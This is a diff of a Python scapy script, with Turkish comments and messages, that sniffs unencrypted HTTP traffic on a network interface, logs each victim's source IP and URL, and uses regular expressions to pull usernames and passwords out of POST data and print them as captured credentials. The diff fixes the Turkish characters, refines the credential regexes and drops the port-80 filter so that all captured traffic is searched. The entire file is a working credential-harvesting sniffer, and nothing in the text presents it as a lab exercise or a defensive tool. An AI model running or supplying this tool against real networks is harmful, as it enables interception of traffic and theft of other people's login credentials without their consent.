@@ -1,40 +1,39 @@
 from scapy.all import *
-from scapy.layers.http import HTTPRequest  # HTTP isteklerini analiz etmek icin
+from scapy.layers.http import HTTPRequest  # HTTP isteklerini analiz etmek için
 import re
 
-# Arayuzu belirtelim (genellikle eth0 veya wlan0 olur)
+# Arayüzü belirtelim
 INTERFACE = "eth0"
 
-# Kullanici adi ve sifreyi yakalamak icin regex desenleri
-USERNAME_REGEX = re.compile(r".*(username|user|login|email)[^=]*=([^&]+)", re.IGNORECASE)
-PASSWORD_REGEX = re.compile(r".*(password|pass|pwd)[^=]*=([^&]+)", re.IGNORECASE)
+# Kullanıcı adı ve şifreyi yakalamak için regex desenleri
+USERNAME_REGEX = re.compile(r"(username|user|login|email)[^=]*=([^&\s]+)", re.IGNORECASE)
+PASSWORD_REGEX = re.compile(r"(password|pass|pwd)[^=]*=([^&\s]+)", re.IGNORECASE)
 
 def packet_callback(packet):
-    # Sadece HTTP istegi iceren paketleri incele
+    # HTTP isteği içeriyorsa
     if packet.haslayer(HTTPRequest):
         http_layer = packet[HTTPRequest]
         ip_layer = packet[IP]
 
-        # Hedefin gittigi URL'yi yazdir
+        # URL'yi yazdır
         url = f"http://{http_layer.Host.decode()}{http_layer.Path.decode()}"
-        print(f"[+] HTTP Istegi: {ip_layer.src} -> {url}")
+        print(f"[+] HTTP İsteği: {ip_layer.src} -> {url}")
 
-        # Eger paket bir POST istegi iceriyorsa icerigi yakala
+        # POST verisini yakala
         if packet.haslayer(Raw):
             load = packet[Raw].load.decode(errors='ignore')
             
-            # Kullanici adi ve sifreleri arayalim
             username_match = USERNAME_REGEX.search(load)
             password_match = PASSWORD_REGEX.search(load)
             
             if username_match or password_match:
-                print("\n[***] Kullanici Bilgisi Yakalandı!")
+                print("\n[***] Kullanıcı Bilgisi Yakalandı!")
                 if username_match:
-                    print(f"Kullanici Adi: {username_match.group(2)}")
+                    print(f"Kullanıcı Adı: {username_match.group(2)}")
                 if password_match:
-                    print(f"Sifre: {password_match.group(2)}")
+                    print(f"Şifre: {password_match.group(2)}")
                 print("\n")
 
-# Paketleri dinlemeye basla
-print(f"[+] {INTERFACE} arayuzu uzerinden HTTP trafiği dinleniyor...")
-sniff(iface=INTERFACE, prn=packet_callback, store=0, filter="tcp port 80")
+# Paketleri dinlemeye başla
+print(f"[+] {INTERFACE} arayüzü üzerinden HTTP trafiği dinleniyor...")
+sniff(iface=INTERFACE, prn=packet_callback, store=0)
